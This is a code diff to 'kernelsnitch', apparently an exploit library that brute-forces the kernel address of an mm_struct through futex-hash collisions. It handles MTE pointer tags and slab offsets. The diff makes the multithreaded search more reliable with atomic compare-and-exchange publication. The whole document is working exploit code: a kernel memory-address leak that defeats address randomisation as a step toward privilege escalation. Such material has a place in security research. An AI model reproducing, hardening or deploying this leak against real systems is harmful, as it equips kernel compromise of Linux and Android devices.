@@ -226,6 +226,57 @@ struct mm_leak_arg {
     struct kernelsnitch_shared_state *ks;
     struct range range;
 };
+
+static int kernelsnitch_search_active(
+    const struct kernelsnitch_shared_state *ks)
+{
+    return __atomic_load_n(&ks->found, __ATOMIC_ACQUIRE) == 0;
+}
+
+static int kernelsnitch_candidate_valid(
+    const struct kernelsnitch_shared_state *ks, size_t candidate)
+{
+    size_t address = candidate;
+    size_t slab_size = KS_PAGE_SIZE << ks->mm_slab_order;
+
+#if KERNELSNITCH_MTE_ENABLED
+    address |= 0xff00000000000000ULL;
+#endif
+    if (!ks->mm_struct_sz || !slab_size || address < IDENTITY_START ||
+        address >= IDENTITY_END) {
+        return 0;
+    }
+
+    size_t slab_base = address & ~(slab_size - 1);
+    size_t offset = address - slab_base;
+    if (offset >= slab_size || offset % ks->mm_struct_sz) {
+        return 0;
+    }
+
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+    size_t object_index = offset / ks->mm_struct_sz;
+    if (object_index < ks->min_object_index ||
+        object_index > ks->max_object_index) {
+        return 0;
+    }
+#endif
+    return 1;
+}
+
+static int kernelsnitch_publish_candidate(
+    struct kernelsnitch_shared_state *ks, size_t candidate)
+{
+    size_t expected = 0;
+
+    if (!kernelsnitch_candidate_valid(ks, candidate) ||
+        !__atomic_compare_exchange_n(&ks->found, &expected, 1, 0,
+                                     __ATOMIC_ACQ_REL, __ATOMIC_ACQUIRE)) {
+        return 0;
+    }
+    __atomic_store_n(&ks->mm_struct, candidate, __ATOMIC_RELEASE);
+    return 1;
+}
+
 static void *__mm_leak(void *arg)
 {
     struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
@@ -233,7 +284,9 @@ static void *__mm_leak(void *arg)
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
-    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
+    for (size_t coarse_addr = range->start;
+         (coarse_addr < range->end) && kernelsnitch_search_active(ks);
+         coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
         size_t coarse_end = coarse_addr + COARSE_SZ;
@@ -244,17 +297,27 @@ static void *__mm_leak(void *arg)
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
         if (ks->exact_identity_partition && coarse_end > range->end)
             coarse_end = range->end;
-        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
+        for (size_t slab_addr = coarse_addr;
+             (slab_addr < coarse_end) && kernelsnitch_search_active(ks);
+             slab_addr += mm_slab_sz) {
             size_t first_candidate =
                 slab_addr + ks->min_object_index * ks->mm_struct_sz;
             size_t candidate_end =
                 slab_addr + (ks->max_object_index + 1) * ks->mm_struct_sz;
             if (candidate_end > slab_addr + mm_slab_sz)
                 candidate_end = slab_addr + mm_slab_sz;
-            for (size_t mm_struct_candidate = first_candidate; (mm_struct_candidate < candidate_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+            for (size_t mm_struct_candidate = first_candidate;
+                 (mm_struct_candidate < candidate_end) &&
+                 kernelsnitch_search_active(ks);
+                 mm_struct_candidate += ks->mm_struct_sz) {
 #else
-        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
-            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+        for (size_t slab_addr = coarse_addr;
+             (slab_addr < coarse_end) && kernelsnitch_search_active(ks);
+             slab_addr += mm_slab_sz) {
+            for (size_t mm_struct_candidate = slab_addr;
+                 (mm_struct_candidate < slab_addr + mm_slab_sz) &&
+                 kernelsnitch_search_active(ks);
+                 mm_struct_candidate += ks->mm_struct_sz) {
 #endif
 
                 size_t found_hash = 1;
@@ -262,18 +325,18 @@ static void *__mm_leak(void *arg)
                     // test the mm_struct candidate
                     for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                         found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
-                    if (found_hash) {
-                        ks->mm_struct = mm_struct_candidate;
-                        ks->found = 1;
+                    if (found_hash &&
+                        kernelsnitch_publish_candidate(
+                            ks, mm_struct_candidate)) {
                         break;
                     }
                 } else {
                     // need to set the tag if mte is enabled
                     for (size_t tag_candidate = 0;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-                         tag_candidate < 16 && !ks->found;
+                         tag_candidate < 16 && kernelsnitch_search_active(ks);
 #else
-                         tag_candidate < 15 && !ks->found;
+                         tag_candidate < 15 && kernelsnitch_search_active(ks);
 #endif
                          ++tag_candidate) {
                         size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
@@ -281,11 +344,11 @@ static void *__mm_leak(void *arg)
                         found_hash = 1;
                         for (size_t i = 1; i < ks->collisions && found_hash; ++i)
                             found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
-                        if (found_hash) {
+                        if (found_hash &&
+                            kernelsnitch_publish_candidate(
+                                ks, __mm_struct_candidate)) {
                             if (ks->verbose)
                                 pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
-                            ks->mm_struct = __mm_struct_candidate;
-                            ks->found = 1;
                             break;
                         }
                     }
@@ -314,7 +377,8 @@ static void *__mm_leak(void *arg)
 struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
 {
     struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
-    ks->mm_struct = -1;
+    __atomic_store_n(&ks->found, 0, __ATOMIC_RELAXED);
+    __atomic_store_n(&ks->mm_struct, (size_t)-1, __ATOMIC_RELAXED);
     ks->mm_struct_sz = __mm_struct_sz;
     ks->mm_slab_order = __mm_slab_order;
     ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
@@ -577,7 +641,10 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
     for (size_t i = 0; i < ks->thread_cnt; ++i)
         if (ks->tids[i])
             pthread_join(ks->tids[i], 0);
-    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
+    ks->state = __atomic_load_n(&ks->mm_struct, __ATOMIC_ACQUIRE) ==
+                        (size_t)-1
+                    ? KERNELSNITCH_MM_NOT_FOUND
+                    : KERNELSNITCH_MM_FOUND;
 }
 
 /**
@@ -596,7 +663,7 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
     ks->futex_addrs = 0;
     munmap((void *)ks->futexes, FUTEX_SZ);
     ks->futexes = 0;
-    size_t ret = ks->mm_struct;
+    size_t ret = __atomic_load_n(&ks->mm_struct, __ATOMIC_ACQUIRE);
     if (ks->verbose) pr_info("done\n");
     munmap(ks, sizeof(struct kernelsnitch_shared_state));
     return ret;
